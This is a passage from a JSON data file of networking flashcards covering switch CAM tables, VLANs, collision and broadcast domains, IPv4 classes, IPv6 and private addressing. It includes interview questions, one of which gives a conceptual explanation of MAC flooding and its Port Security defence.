      "cardNumber": 1,
      "badge": "Concept",
      "title": "What is Switching Mechanics & CAM/MAC Address Table?",
      "inSimpleWords": "A Layer 2 Switch is an intelligent multiport network bridge that uses a Content Addressable Memory (CAM) table to forward frames directly to target recipient ports without flooding.",
      "analogy": "A receptionist at an office lobby who writes down every employee's room number the first time they walk in. When a package arrives for Bob, the receptionist sends the courier directly to room 302 instead of shouting in all rooms.",
      "diagramType": null
    },
    {
      "cardNumber": 2,
      "badge": "Motivation",
      "title": "Why do we need Switching Mechanics & CAM/MAC Address Table?",
      "problem": "A legacy Hub blindly broadcasts every frame out of all ports, creating massive electrical collisions, wasting bandwidth, and leaking data to eavesdroppers.",
      "whyItMatters": "Switches form the backbone of all modern Ethernet LANs, providing dedicated full-duplex gigabit bandwidth to every connected device simultaneously.",
      "howSolves": "Switches dynamically learn the Source MAC address of every incoming frame and record it against the receiving physical port in their CAM table."
    },
    {
      "cardNumber": 3,
      "badge": "Mechanics",
      "title": "How does Switching Mechanics & CAM/MAC Address Table work?",
      "steps": [
        {
          "step": 1,
          "title": "Frame Ingestion",
          "desc": "Frame arrives on Switch Port 1 with Src MAC A and Dest MAC B."
        },
        {
          "step": 2,
          "title": "Source Learning",
          "desc": "Switch records binding: [MAC A -> Port 1] in CAM table and resets aging timer (300s)."
        },
        {
          "step": 3,
          "title": "Destination Lookup",
          "desc": "Switch looks up Dest MAC B in CAM table."
        },
        {
          "step": 4,
          "title": "Selective Forwarding",
          "desc": "If found (MAC B -> Port 4), frame is forwarded ONLY out of Port 4. If unknown, switch floods frame out all ports except Port 1."
        }
      ],
      "vfxType": "switching"
    },
    {
      "cardNumber": 4,
      "badge": "Architecture",
      "title": "Internal Structure & Formats",
      "structureDetails": {
        "CAM Table Columns": "VLAN ID | MAC Address | Type (Dynamic/Static) | Port Number",
        "Aging Timer": "Default 300 seconds (5 minutes) before inactive entries are flushed",
        "Forwarding Logic": "Unicast Forward (known) | Unknown Unicast Flood (unknown) | Broadcast Flood | Multicast Flood",
        "ASIC Architecture": "Application-Specific Integrated Circuits enable wire-speed hardware switching"
      },
      "diagramType": "ethernet-frame"
    },
    {
      "cardNumber": 5,
      "badge": "Process Flow",
      "title": "Step-by-Step Flow",
      "scenario": "An enterprise switch connects 48 workstations. Host 1 sends a heavy 50 GB database backup to Host 2.",
      "challenge": "If the switch flooded the 50 GB backup to all 48 ports, all other 46 employees would experience severe network lag.",
      "resolution": "The switch has learned Host 2 is on Port 2. It switches the 50 GB stream strictly between Port 1 and Port 2 at wire-speed, leaving all other 46 ports completely unaffected.",
      "vfxType": "switching"
    },
    {
      "cardNumber": 6,
      "badge": "Example",
      "title": "Real-World Technical Example",
      "exampleValues": {
        "Cisco Command": "show mac address-table",
        "Sample CAM Entry": "VLAN 10 | 0014.2201.2345 | DYNAMIC | FastEthernet0/5",
        "Unknown Unicast Flood": "Forwarded out ports 2 through 48 when destination MAC is not yet in CAM table"
      }
    },
    {
      "cardNumber": 7,
      "badge": "Execution",
      "title": "Interactive Live Flow Simulation",
      "fullWorkingFlow": "Complete end-to-end packet transmission for Switching Mechanics & CAM/MAC Address Table. Observe how data moves between sender, intermediate network nodes, and receiver with dynamic states.",
      "vfxType": "switching"
    },
    {
      "cardNumber": 8,
      "badge": "Traps",
      "title": "Common Mistakes & Interview Traps",
      "traps": [
        {
          "wrong": "A switch learns MAC addresses from the Destination MAC field of the frame.",
          "why": "The switch has no idea where the destination device is until that device sends traffic.",
          "correct": "A switch learns MAC addresses strictly from the SOURCE MAC address of incoming frames."
        },
        {
          "wrong": "Switches never flood traffic under normal operation.",
          "why": "Switches MUST flood broadcasts (FF:FF:FF:FF:FF:FF) and unknown unicasts whose MAC has not been learned yet.",
          "correct": "Switches flood broadcasts, multicasts, and unknown unicasts out of all ports except the receiving port."
        },
        {
          "wrong": "A switch port can only ever learn 1 MAC address.",
          "why": "If a switch port is connected to another switch or a hypervisor running multiple VMs, it learns multiple MACs on that single port.",
          "correct": "A switch port can learn hundreds of MAC addresses in its CAM table."
        }
      ]
    },
    {
      "cardNumber": 9,
      "badge": "Interview",
      "title": "Interview & Placement Question",
      "questions": [
        {
          "q": "What is a MAC Flooding Attack (CAM Table Overflow) and how does it compromise switch security?",
          "a": "A switch CAM table has finite hardware memory (e.g., 8,000 to 128,000 MAC entries). In a MAC Flooding attack, an attacker uses tools like macof to generate hundreds of thousands of bogus Ethernet frames with randomized fake source MAC addresses every second. The switch CAM table fills to capacity, evicting legitimate entries. When the CAM table overflows, the switch can no longer store new MACs and enters 'Fail-Open' mode: it treats all incoming frames as Unknown Unicasts and floods them out of EVERY physical port. The switch effectively degrades into a dumb Hub, allowing the attacker on any port to sniff all confidential network traffic with Wireshark. Defense: Port Security (limiting MAC count per port).",
          "tip": "Explain the transition: 'Switch CAM table overflows -> switch degrades into a hub -> attacker sniffs traffic.' Mention Port Security as mitigation."
        }
      ]
    },
    {
      "cardNumber": 10,
      "badge": "Summary",
      "title": "Quick Revision & Cheat Sheet",
      "cheatSheet": {
        "keyRule": "Switch learns from SOURCE MAC; forwards by DESTINATION MAC. Floods if destination is unknown.",
        "summaryPoints": [
          "Learns incoming Source MAC -> physical ingress port mapping.",
          "Forwards known unicasts exclusively to destination port.",
          "Floods broadcasts and unknown unicasts out all ports except source.",
          "Entries age out after 300 seconds of inactivity to support moved devices."
        ],
        "whenToUse": "The foundational mechanism of enterprise Ethernet switching, LAN security, and network performance."
      }
    }
  ],
  "vlan": [
    {
      "cardNumber": 1,
      "badge": "Concept",
      "title": "What is VLAN?",
      "inSimpleWords": "A Virtual LAN (VLAN, IEEE 802.1Q) logically partitions a single physical Layer 2 switch infrastructure into multiple isolated broadcast domains.",
      "analogy": "An apartment building with a single physical staircase, but tenants are issued keycards that only unlock doors for their designated floor. Finance floor cannot access Engineering floor.",
      "diagramType": null
    },
    {
      "cardNumber": 2,
      "badge": "Motivation",
      "title": "Why do we need VLAN?",
      "problem": "In a 500-person building, broadcast storms (ARP requests, DHCP broadcasts) flood every single PC, while guest users on Wi-Fi can sniff sensitive HR payroll servers on the same switch.",
      "whyItMatters": "VLANs eliminate the need to purchase separate physical switches for each department, improving security, reducing broadcast overhead, and simplifying network administration.",
      "howSolves": "Switches tag Ethernet frames with a 4-byte 802.1Q header containing a 12-bit VLAN ID (1 to 4094). Frames never cross between VLANs unless routed by a Layer 3 router."
    },
    {
      "cardNumber": 3,
      "badge": "Mechanics",
      "title": "How does VLAN work?",
      "steps": [
        {
          "step": 1,
          "title": "Access Port Ingress",
          "desc": "Untagged frame enters Access Port assigned to VLAN 10 (Finance)."
        },
        {
          "step": 2,
          "title": "802.1Q Tagging",
          "desc": "Switch inserts 4-byte 802.1Q tag (VLAN ID 10) into frame header before transmitting over Trunk link."
        },
        {
          "step": 3,
          "title": "Trunk Link Transit",
          "desc": "Trunk link carries multiplexed tagged traffic from VLAN 10, VLAN 20, VLAN 30 between switches."
        },
        {
          "step": 4,
          "title": "Access Port Egress",
          "desc": "Destination switch strips the 802.1Q tag and forwards standard untagged frame to target PC on VLAN 10."
        }
      ],
      "vfxType": "switching"
    },
    {
      "cardNumber": 4,
      "badge": "Architecture",
      "title": "Internal Structure & Formats",
      "structureDetails": {
        "TPID (2 Bytes)": "Tag Protocol Identifier: 0x8100 identifies 802.1Q tagged frame",
        "PCP (3 bits)": "Priority Code Point for Layer 2 Quality of Service (QoS / CoS)",
        "DEI (1 bit)": "Drop Eligible Indicator for congestion discarding",
        "VID (12 bits)": "VLAN Identifier: 2^12 = 4,096 VLANs (VLAN 1 default, 1-4094 usable)",
        "Port Types": "Access Port (single VLAN, untagged) | Trunk Port (multiple VLANs, tagged)"
      },
      "diagramType": null
    },
    {
      "cardNumber": 5,
      "badge": "Process Flow",
      "title": "Step-by-Step Flow",
      "scenario": "A hospital switch connects receptionist terminals, patient monitoring devices, and guest public Wi-Fi on the same 48-port switch.",
      "challenge": "Patient cardiac telemetry devices must never be accessible from the public guest Wi-Fi network.",
      "resolution": "Assign Guest Wi-Fi to VLAN 50, Reception to VLAN 20, and Medical Telemetry to VLAN 30. Traffic between VLANs is blocked at Layer 2.",
      "vfxType": "switching"
    },
    {
      "cardNumber": 6,
      "badge": "Example",
      "title": "Real-World Technical Example",
      "exampleValues": {
        "VLAN 1": "Default native management VLAN",
        "VLAN 10": "Engineering Subnet: 10.0.10.0/24",
        "VLAN 20": "HR / Payroll Subnet: 10.0.20.0/24",
        "VLAN 99": "Guest Public Wi-Fi: 192.168.99.0/24",
        "Native VLAN": "Untagged traffic traversing an 802.1Q trunk port"
      }
    },
    {
      "cardNumber": 7,
      "badge": "Execution",
      "title": "Interactive Live Flow Simulation",
      "fullWorkingFlow": "Complete end-to-end packet transmission for VLAN (Virtual Local Area Network) & 802.1Q Tagging. Observe how data moves between sender, intermediate network nodes, and receiver with dynamic states.",
      "vfxType": "switching"
    },
    {
      "cardNumber": 8,
      "badge": "Traps",
      "title": "Common Mistakes & Interview Traps",
      "traps": [
        {
          "wrong": "Two computers on different VLANs on the same switch can communicate directly at Layer 2.",
          "why": "VLANs create completely isolated broadcast domains.",
          "correct": "Communication between different VLANs ALWAYS requires a Layer 3 routing device (Router-on-a-Stick or Layer 3 Switch)."
        },
        {
          "wrong": "End user PCs send tagged 802.1Q frames to access ports.",
          "why": "Standard PC network cards do not understand 802.1Q tags.",
          "correct": "The switch inserts tags on ingress and strips tags before delivering frames to end user access ports."
        },
        {
          "wrong": "VLANs provide encryption for network packets.",
          "why": "802.1Q adds a plain text header tag, not cryptography.",
          "correct": "VLANs provide logical isolation, not data encryption. Use IPsec or TLS for encryption."
        }
      ]
    },
    {
      "cardNumber": 9,
      "badge": "Interview",
      "title": "Interview & Placement Question",
      "questions": [
        {
          "q": "What is 'Router-on-a-Stick' and how does it enable Inter-VLAN routing?",
          "a": "Because switches cannot route traffic between different VLANs at Layer 2, Inter-VLAN routing is required. In a 'Router-on-a-Stick' architecture, a single physical Ethernet interface on a router connects to a switch Trunk port. The router's physical interface is subdivided into logical 'sub-interfaces' (e.g., gig0/0.10 for VLAN 10 and gig0/0.20 for VLAN 20), each configured with 802.1Q encapsulation and assigned the default gateway IP for that VLAN. When Host A on VLAN 10 sends a packet to Host B on VLAN 20, the frame is tagged VLAN 10, sent up the trunk to the router sub-interface, routed internally at Layer 3 to sub-interface 20, re-tagged as VLAN 20, and sent back down the trunk to the switch.",
          "tip": "Draw the diagram: Switch trunk <== Single Cable ==> Router sub-interfaces gig0/0.10 & gig0/0.20."
        }
      ]
    },
    {
      "cardNumber": 10,
      "badge": "Summary",
      "title": "Quick Revision & Cheat Sheet",
      "cheatSheet": {
        "keyRule": "VLAN = logical broadcast domain. Access port = untagged (1 VLAN); Trunk port = tagged (802.1Q).",
        "summaryPoints": [
          "Isolates broadcast domains on shared physical switch hardware.",
          "802.1Q adds 4-byte tag with 12-bit VLAN ID (supports up to 4094 VLANs).",
          "Inter-VLAN routing requires a Layer 3 Router or Layer 3 Switch.",
          "Native VLAN passes across trunk links untagged."
        ],
        "whenToUse": "Standard enterprise network design for departmental segmentation, security, and broadcast storm mitigation."
      }
    }
  ],
  "collision-broadcast-domains": [
    {
      "cardNumber": 1,
      "badge": "Concept",
      "title": "What is Collision Domains vs Broadcast Domains?",
      "inSimpleWords": "A Collision Domain is a physical network segment where electrical data packets can collide with each other during simultaneous transmission. A Broadcast Domain is a logical network area where a broadcast frame sent by one device is received and processed by every other device.",
      "analogy": "Collision domain is two people talking over each other in a room; Broadcast domain is the room's walls: if someone yells 'Fire!', everyone in that room hears it, but people in the next building (separated by a router) do not.",
      "diagramType": null
    },
    {
      "cardNumber": 2,
      "badge": "Motivation",
      "title": "Why do we need Collision Domains vs Broadcast Domains?",
      "problem": "In early bus networks, multiple PCs transmitting simultaneously caused electrical signal degradation (collisions). In flat switched networks, broadcast storms consume 100% of CPU across all workstations.",
      "whyItMatters": "Network performance tuning is all about MINIMIZING collision domain size (to 1 device per port) and SEGMENTING broadcast domain size (using routers and VLANs).",
      "howSolves": "Switches create micro-segments providing a dedicated collision domain per port; Routers and VLANs break up broadcast domains."
    },
    {
      "cardNumber": 3,
      "badge": "Mechanics",
      "title": "How does Collision Domains vs Broadcast Domains work?",
      "steps": [
        {
          "step": 1,
          "title": "Hub Topology",
          "desc": "1 giant collision domain across all ports. CSMA/CD backoff algorithm handles collisions."
        },
        {
          "step": 2,
          "title": "Switch Micro-segmentation",
          "desc": "Each switch port is an isolated collision domain. Full-duplex eliminates collisions entirely."
        },
        {
          "step": 3,
          "title": "Broadcast Traversal",
          "desc": "Switch forwards ARP broadcasts (FF:FF:FF:FF:FF:FF) out of all ports in the VLAN."
        },
        {
          "step": 4,
          "title": "Router Boundary",
          "desc": "Router drops Layer 2 broadcast frames, containing the broadcast domain within the local subnet."
        }
      ],
      "vfxType": "switching"
    },
    {
      "cardNumber": 4,
      "badge": "Architecture",
      "title": "Internal Structure & Formats",
      "structureDetails": {
        "Hub (12 Ports)": "1 Collision Domain | 1 Broadcast Domain",
        "Bridge (2 Ports)": "2 Collision Domains | 1 Broadcast Domain",
        "Switch (24 Ports)": "24 Collision Domains | 1 Broadcast Domain (Default VLAN 1)",
        "Router (4 Ports)": "4 Collision Domains | 4 Broadcast Domains"
      },
      "diagramType": null
    },
    {
      "cardNumber": 5,
      "badge": "Process Flow",
      "title": "Step-by-Step Flow",
      "scenario": "An office network with 200 PCs suddenly suffers massive lag because a malfunctioning network printer is broadcasting thousands of invalid packets per second.",
      "challenge": "Because all 200 PCs reside on a single flat switch without VLANs, every PC's CPU interrupts to process the broadcast storm.",
      "resolution": "Subdivide the network into 4 subnets (50 PCs each) separated by a Layer 3 router. The broadcast storm is contained to only 50 PCs, saving the remaining 150 machines.",
      "vfxType": "switching"
    },
    {
      "cardNumber": 6,
      "badge": "Example",
      "title": "Real-World Technical Example",
      "exampleValues": {
        "CSMA/CD": "Carrier Sense Multiple Access with Collision Detection (half-duplex)",
        "Collision Signal": "Jam signal transmitted when voltage spike detected on wire",
        "Broadcast Address IP": "255.255.255.255 or 192.168.1.255 (directed broadcast)",
        "Broadcast MAC": "FF:FF:FF:FF:FF:FF"
      }
    },
    {
      "cardNumber": 7,
      "badge": "Execution",
      "title": "Interactive Live Flow Simulation",
      "fullWorkingFlow": "Complete end-to-end packet transmission for Collision Domains vs Broadcast Domains. Observe how data moves between sender, intermediate network nodes, and receiver with dynamic states.",
      "vfxType": "switching"
    },
    {
      "cardNumber": 8,
      "badge": "Traps",
      "title": "Common Mistakes & Interview Traps",
      "traps": [
        {
          "wrong": "Switches eliminate broadcast domains.",
          "why": "Switches forward all broadcast frames.",
          "correct": "Switches eliminate collision domains; Routers eliminate broadcast domains."
        },
        {
          "wrong": "Full-duplex Ethernet still experiences packet collisions.",
          "why": "Full-duplex uses dedicated separate wire pairs for transmit (Tx) and receive (Rx).",
          "correct": "Full-duplex Ethernet has ZERO collisions; CSMA/CD is completely disabled on full-duplex switch links."
        },
        {
          "wrong": "A 48-port switch with 3 VLANs has 1 broadcast domain.",
          "why": "Each configured VLAN represents a distinct logical broadcast domain.",
          "correct": "A 48-port switch with 3 configured VLANs has 48 collision domains and 3 broadcast domains."
        }
      ]
    },
    {
      "cardNumber": 9,
      "badge": "Interview",
      "title": "Interview & Placement Question",
      "questions": [
        {
          "q": "You have a network with 2 hubs (each with 4 ports), connected to a 12-port switch, which connects to a router with 2 interfaces. How many collision domains and broadcast domains exist?",
          "a": "Let's count: 1. Each hub forms 1 collision domain regardless of how many devices connect to it. Two hubs = 2 collision domains. 2. The switch provides 1 collision domain per active port. If 2 ports connect to the hubs, 1 port connects to the router, and let's say remaining 9 ports connect to PCs: the switch has 12 collision domains. (Total collision domains = 12, because the hubs attach to individual switch ports). 3. The router interface isolates the broadcast domain. The switch and hubs all share 1 single broadcast domain on Router Interface 1. Router Interface 2 forms a 2nd broadcast domain. Total: 12 collision domains and 2 broadcast domains.",
          "tip": "Practice counting collision and broadcast domains from network topology diagrams. It is an extremely common technical test question."
        }
      ]
    },
    {
      "cardNumber": 10,
      "badge": "Summary",
      "title": "Quick Revision & Cheat Sheet",
      "cheatSheet": {
        "keyRule": "Collision domain = where packets collide (1 per switch port); Broadcast domain = where broadcasts reach (bounded by routers).",
        "summaryPoints": [
          "Hub = 1 Collision Domain, 1 Broadcast Domain.",
          "Switch = 1 Collision Domain per port, 1 Broadcast Domain per VLAN.",
          "Router = 1 Collision Domain per interface, 1 Broadcast Domain per interface.",
          "Full duplex Ethernet on switches eliminates collisions completely."
        ],
        "whenToUse": "Essential for network sizing, broadcast storm isolation, and topology calculation tests."
      }
    }
  ],
  "ip-addressing": [
    {
      "cardNumber": 1,
      "badge": "Concept",
      "title": "What is IPv4 Addressing & Classful Architecture?",
      "inSimpleWords": "An IPv4 address is a 32-bit (4-byte) logical identifier assigned to every device connected to an IP network, divided into a Network ID and a Host ID.",
      "analogy": "Like a phone number: Area Code (Network ID) identifies the city; Local Extension (Host ID) identifies the specific desk phone in that building.",
      "diagramType": null
    },
    {
      "cardNumber": 2,
      "badge": "Motivation",
      "title": "Why do we need IPv4 Addressing & Classful Architecture?",
      "problem": "Flat physical MAC addresses cannot scale to global routing across billions of devices without collapsing router memory.",
      "whyItMatters": "Hierarchical IP addressing allows routers to route millions of packets using compact prefix rules rather than maintaining a route for every individual device.",
      "howSolves": "Dividing the 32-bit address into Network and Host portions enables hierarchical prefix aggregation across global autonomous systems."
    },
    {
      "cardNumber": 3,
      "badge": "Mechanics",
      "title": "How does IPv4 Addressing & Classful Architecture work?",
      "steps": [
        {
          "step": 1,
          "title": "Class A (0.0.0.0 - 127.255.255.255)",
          "desc": "First bit '0'. Default mask /8 (255.0.0.0). 128 networks, 16,777,214 hosts per network."
        },
        {
          "step": 2,
          "title": "Class B (128.0.0.0 - 191.255.255.255)",
          "desc": "First bits '10'. Default mask /16 (255.255.0.0). 16,384 networks, 65,534 hosts each."
        },
        {
          "step": 3,
          "title": "Class C (192.0.0.0 - 223.255.255.255)",
          "desc": "First bits '110'. Default mask /24 (255.255.255.0). 2,097,152 networks, 254 hosts each."
        },
        {
          "step": 4,
          "title": "Class D & E",
          "desc": "Class D (224-239) for Multicast; Class E (240-255) reserved for experimental research."
        }
      ],
      "vfxType": "routing"
    },
    {
      "cardNumber": 4,
      "badge": "Architecture",
      "title": "Internal Structure & Formats",
      "structureDetails": {
        "Total Address Size": "32 bits = 4 octets (e.g. 192.168.1.1)",
        "Dotted Decimal Format": "Four decimal numbers (0-255) separated by periods",
        "Network ID": "Identifies the specific subnet (masked by 1s in subnet mask)",
        "Host ID": "Identifies the specific device interface (masked by 0s in subnet mask)",
        "Usable Hosts Formula": "2^(host bits) - 2 (subtract Network ID and Broadcast IP)"
      },
      "diagramType": "ipv4-header"
    },
    {
      "cardNumber": 5,
      "badge": "Process Flow",
      "title": "Step-by-Step Flow",
      "scenario": "A company receives a Class C block 192.168.1.0/24 and configures workstations.",
      "challenge": "Why can the company only assign addresses from .1 to .254 instead of all 256 addresses?",
      "resolution": "The first address (192.168.1.0) is reserved as the Network ID; the last address (192.168.1.255) is reserved as the Directed Broadcast address.",
      "vfxType": "routing"
    },
    {
      "cardNumber": 6,
      "badge": "Example",
      "title": "Real-World Technical Example",
      "exampleValues": {
        "Loopback Address": "127.0.0.1 (local machine internal testing)",
        "APIPA Automatic IP": "169.254.0.0/16 (DHCP failure fallback)",
        "Default Route": "0.0.0.0/0 (matches any internet destination)",
        "Total IPv4 Space": "2^32 = 4,294,967,296 total addresses"
      }
    },
    {
      "cardNumber": 7,
      "badge": "Execution",
      "title": "Interactive Live Flow Simulation",
      "fullWorkingFlow": "Complete end-to-end packet transmission for IPv4 Addressing & Classful Architecture (A, B, C, D, E). Observe how data moves between sender, intermediate network nodes, and receiver with dynamic states.",
      "vfxType": "routing"
    },
    {
      "cardNumber": 8,
      "badge": "Traps",
      "title": "Common Mistakes & Interview Traps",
      "traps": [
        {
          "wrong": "An IP address permanently belongs to a computer motherboard.",
          "why": "IP addresses are logical and change when you move networks.",
          "correct": "MAC addresses are tied to physical hardware; IP addresses are assigned dynamically by the local network."
        },
        {
          "wrong": "You can assign 192.168.1.255 to a laptop in a /24 network.",
          "why": "The all-1s host portion is the directed broadcast address.",
          "correct": "The first address (all 0s) and last address (all 1s) in any subnet cannot be assigned to hosts."
        },
        {
          "wrong": "127.0.0.1 packets travel out through your Ethernet cable to the router.",
          "why": "The OS kernel intercepts 127.0.0.1 internally in the loopback interface driver.",
          "correct": "Loopback traffic never touches physical network hardware or transmission media."
        }
      ]
    },
    {
      "cardNumber": 9,
      "badge": "Interview",
      "title": "Interview & Placement Question",
      "questions": [
        {
          "q": "Why were classful IP addresses (Classes A, B, C) replaced by Classless Inter-Domain Routing (CIDR)?",
          "a": "Classful addressing was excessively rigid and caused massive IPv4 address waste. For example, if an enterprise needed 300 IP addresses, a Class C network (254 hosts) was too small, forcing the allocation of a Class B network (65,534 hosts). This resulted in over 65,000 unused wasted addresses in a single allocation. By 1993, IPv4 address space was near exhaustion, and core router routing tables were exploding. Classless Inter-Domain Routing (CIDR, RFC 1519) eliminated rigid class boundaries by allowing arbitrary prefix lengths (e.g. /23 giving 510 hosts), enabling efficient address allocation and route summarization.",
          "tip": "Explain the exact host numbers: Class A (16M), Class B (65k), Class C (254) to prove technical precision."
        }
      ]
    },
    {
      "cardNumber": 10,
      "badge": "Summary",
      "title": "Quick Revision & Cheat Sheet",
      "cheatSheet": {
        "keyRule": "32 bits = 4 bytes. Subnet mask separates Network ID from Host ID. Usable = 2^H - 2.",
        "summaryPoints": [
          "Class A: 1-126 (/8); Class B: 128-191 (/16); Class C: 192-223 (/24).",
          "127.0.0.0/8 is reserved for internal loopback testing.",
          "Network Address has all host bits = 0; Broadcast Address has all host bits = 1.",
          "Total theoretical IPv4 space is ~4.3 billion addresses."
        ],
        "whenToUse": "The baseline for all IP routing, subnet configuration, and address planning."
      }
    }
  ],
  "ipv4-vs-ipv6": [
    {
      "cardNumber": 1,
      "badge": "Concept",
      "title": "What is IPv4 vs IPv6 Architecture & Migration?",
      "inSimpleWords": "IPv6 is the next-generation Internet Protocol offering a 128-bit address space (3.4 x 10^38 addresses), replacing 32-bit IPv4 to solve global address exhaustion.",
      "analogy": "IPv4 is like a 10-digit telephone system running out of numbers for a booming city; IPv6 assigns enough telephone numbers to give every single grain of sand on Earth its own IP address.",
      "diagramType": null
    },
    {
      "cardNumber": 2,
      "badge": "Motivation",
      "title": "Why do we need IPv4 vs IPv6 Architecture & Migration?",
      "problem": "The original 4.3 billion IPv4 addresses officially ran out at IANA in 2011, requiring complex NAT hacks to share IPs across smartphones and IoT devices.",
      "whyItMatters": "Modern 5G networks, cloud data centers, and major platforms (Google, Meta, Apple) operate native IPv6 for lower latency and peer-to-peer reachability.",
      "howSolves": "128-bit addresses eliminate NAT; simplified 40-byte fixed headers accelerate router hardware processing; built-in SLAAC and IPsec security."
    },
    {
      "cardNumber": 3,
      "badge": "Mechanics",
      "title": "How does IPv4 vs IPv6 Architecture & Migration work?",
      "steps": [
        {
          "step": 1,
          "title": "Address Space Expansion",
          "desc": "128 bits vs 32 bits. Formatted as 8 groups of 4 hexadecimal digits separated by colons."
        },
        {
          "step": 2,
          "title": "Fixed Header Architecture",
          "desc": "IPv6 uses a fixed 40-byte base header; optional features use daisy-chained extension headers."
        },
        {
          "step": 3,
          "title": "No Broadcasts",
          "desc": "IPv6 completely eliminates noisy broadcast frames, replacing them with efficient Multicast and Anycast."
        },
        {
          "step": 4,
          "title": "Autoconfiguration (SLAAC)",
          "desc": "Stateless Address Autoconfiguration allows devices to generate their own IP without a DHCP server."
        }
      ],
      "vfxType": "routing"
    },
    {
      "cardNumber": 4,
      "badge": "Architecture",
      "title": "Internal Structure & Formats",
      "structureDetails": {
        "IPv4": "32 bits (4 Bytes) | Dotted decimal | Variable header (20-60B) | Checksum | Broadcasts | NAT required",
        "IPv6": "128 bits (16 Bytes) | Hexadecimal colons | Fixed header (40B) | No Checksum | Multicast/Anycast | No NAT",
        "IPv6 Format": "2001:0db8:85a3:0000:0000:8a2e:0370:7334",
        "Compression Rules": "Omit leading zeros (:0db8: -> :db8:); Replace consecutive zero blocks with '::' (once per address)"
      },
      "diagramType": "ipv4-header"
    },
    {
      "cardNumber": 5,
      "badge": "Process Flow",
      "title": "Step-by-Step Flow",
      "scenario": "A telecommunications provider launches 50 million 5G mobile smartphones.",
      "challenge": "The carrier cannot acquire 50 million public IPv4 addresses, and running CGNAT for 50 million smartphones introduces latency and session state bottlenecks.",
      "resolution": "The carrier deploys native IPv6-only cellular APNs. Each smartphone receives a globally unique /64 IPv6 prefix directly.",
      "vfxType": "routing"
    },
    {
      "cardNumber": 6,
      "badge": "Example",
      "title": "Real-World Technical Example",
      "exampleValues": {
        "Loopback IPv4 vs IPv6": "127.0.0.1 <==> ::1",
        "Unspecified Address": "0.0.0.0 <==> ::",
        "Compressed IPv6": "2001:db8:85a3::8a2e:370:7334",
        "Link-Local Prefix": "fe80::/10 (automatically assigned on every interface)"
      }
    },
    {
      "cardNumber": 7,
      "badge": "Execution",
      "title": "Interactive Live Flow Simulation",
      "fullWorkingFlow": "Complete end-to-end packet transmission for IPv4 vs IPv6 Architecture & Migration. Observe how data moves between sender, intermediate network nodes, and receiver with dynamic states.",
      "vfxType": "routing"
    },
    {
      "cardNumber": 8,
      "badge": "Traps",
      "title": "Common Mistakes & Interview Traps",
      "traps": [
        {
          "wrong": "You can use '::' multiple times in an IPv6 address to compress zeros.",
          "why": "Using '::' more than once introduces ambiguity when reconstructing the 128-bit address.",
          "correct": "The double colon '::' can be used ONLY ONCE per IPv6 address."
        },
        {
          "wrong": "IPv6 routers calculate a header checksum at every hop.",
          "why": "Checksum was eliminated from the IPv6 header to accelerate router switching speed.",
          "correct": "IPv6 relies on Layer 2 (Ethernet CRC) and Layer 4 (TCP/UDP checksum) for error detection."
        },
        {
          "wrong": "IPv4 and IPv6 can communicate directly without translation.",
          "why": "IPv4 and IPv6 are incompatible protocol formats on the wire.",
          "correct": "Communication requires Dual-Stack (running both protocols), Tunneling (6in4), or Translation (NAT64/DNS64)."
        }
      ]
    },
    {
      "cardNumber": 9,
      "badge": "Interview",
      "title": "Interview & Placement Question",
      "questions": [
        {
          "q": "Why does IPv6 omit the header checksum that was present in IPv4?",
          "a": "In IPv4, every intermediate router hop decrements the TTL field by 1, requiring the router's CPU to recalculate the IPv4 header checksum at every single hop, creating latency. In IPv6, the header checksum was deliberately eliminated because: 1. Layer 2 Data Link protocols (Ethernet CRC, Wi-Fi) already provide robust frame integrity checks. 2. Layer 4 Transport protocols (TCP and UDP mandatory in IPv6) already compute checksums over the payload and pseudo-header. Removing the L3 checksum allows hardware router ASICs to forward IPv6 packets significantly faster without computing arithmetic checksums at every transit hop.",
          "tip": "Explain that removing the checksum enables faster hardware ASIC packet forwarding."
        }
      ]
    },
    {
      "cardNumber": 10,
      "badge": "Summary",
      "title": "Quick Revision & Cheat Sheet",
      "cheatSheet": {
        "keyRule": "IPv4 = 32-bit dotted-decimal; IPv6 = 128-bit hex colon. No checksum, no broadcasts, no NAT.",
        "summaryPoints": [
          "128-bit address space provides 3.4 x 10^38 addresses (virtually infinite).",
          "Fixed 40-byte base header accelerates hardware router forwarding.",
          "Zero compression rule: '::' can only be used once per address.",
          "Coexistence mechanisms: Dual-Stack, Tunneling, and NAT64."
        ],
        "whenToUse": "Modern cloud architectures, mobile telecommunications, and next-generation system design."
      }
    }
  ],
  "public-vs-private-ip": [
    {
      "cardNumber": 1,
      "badge": "Concept",
      "title": "What is Public vs Private IP?",
      "inSimpleWords": "Public IP addresses are globally unique and routable across the public Internet. Private IP addresses (RFC 1918) are non-routable on the Internet, reserved for internal home, campus, and enterprise LANs.",
      "analogy": "Public IP is your home's official street address on Google Maps; Private IP is an apartment unit number (Unit 4B) inside your private building complex.",
      "diagramType": null
    },
    {
      "cardNumber": 2,
      "badge": "Motivation",
      "title": "Why do we need Public vs Private IP?",
      "problem": "If all 25 billion connected computers had public IPs, IPv4 would have collapsed decades ago, and every internal printer would be directly hackable from the public internet.",
      "whyItMatters": "RFC 1918 private addressing paired with NAT allowed the entire Internet to scale from 1996 through today using only 4.3 billion IPv4 addresses.",
      "howSolves": "Internet core routers are configured to drop any packet bearing an RFC 1918 private destination IP. Private devices communicate externally through a NAT gateway router."
    },
    {
      "cardNumber": 3,
      "badge": "Mechanics",
      "title": "How does Public vs Private IP work?",
      "steps": [
        {
          "step": 1,
          "title": "Class A Private (10.0.0.0/8)",
          "desc": "10.0.0.0 to 10.255.255.255. 1 single /8 block = 16,777,216 addresses. Ideal for large enterprises."
        },
        {
          "step": 2,
          "title": "Class B Private (172.16.0.0/12)",
          "desc": "172.16.0.0 to 172.31.255.255. 16 contiguous /16 blocks = 1,048,576 addresses. Medium networks."
        },
        {
          "step": 3,
          "title": "Class C Private (192.168.0.0/16)",
          "desc": "192.168.0.0 to 192.168.255.255. 256 contiguous /24 blocks = 65,536 addresses. Home routers."
        },
        {
          "step": 4,
          "title": "Carrier-Grade NAT (CGNAT)",
          "desc": "100.64.0.0/10 (RFC 6598) reserved for ISPs to NAT multiple residential subscribers behind one public IP."
        }
      ],
      "vfxType": "nat"
    },
    {
      "cardNumber": 4,
      "badge": "Architecture",
      "title": "Internal Structure & Formats",
      "structureDetails": {
        "10.0.0.0/8": "10.0.0.0 - 10.255.255.255 (16.7 Million hosts | Large cloud VPCs)",
        "172.16.0.0/12": "172.16.0.0 - 172.31.255.255 (1 Million hosts | Corporate campuses)",
        "192.168.0.0/16": "192.168.0.0 - 192.168.255.255 (65k hosts | Home Wi-Fi routers)",
